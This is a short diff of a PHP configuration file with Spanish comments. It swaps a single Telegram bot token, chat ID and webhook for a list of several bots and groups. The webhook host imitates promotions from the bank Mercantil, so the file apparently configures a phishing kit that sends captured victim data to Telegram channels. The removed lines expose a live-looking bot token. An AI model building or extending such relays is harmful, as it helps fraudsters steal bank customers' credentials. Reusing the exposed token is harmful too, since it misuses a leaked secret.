@@ -10,8 +10,20 @@ if (basename($_SERVER['PHP_SELF']) === basename(__FILE__)) {
     exit('Acceso prohibido.');
 }
 
-// ⚙️ Configuración principal (solo accesible por inclusión)
-$bot_token_2 = '8610018240:AAGYMF9dO7Ay-YSb853DB3XhT4lnmMnabY4';  
-$chat_id_2   = '-1003964372304';
-$webhook_url = 'https://promocionesmercantil.onrender.com/approve.php'; //Reemplaza (LINK_AQUI) completo, por tu link.
+// ⚙️ Bots y grupos
+$telegram_accounts = [
+
+    [
+        'token' => 'TOKEN_BOT_1',
+        'chat_id' => '-1003964372304'
+    ],
+
+    [
+        'token' => 'TOKEN_BOT_2',
+        'chat_id' => '-1001234567890'
+    ]
+
+];
+
+$webhook_url = 'https://promocionesmercantil.onrender.com/approve.php';
 ?>
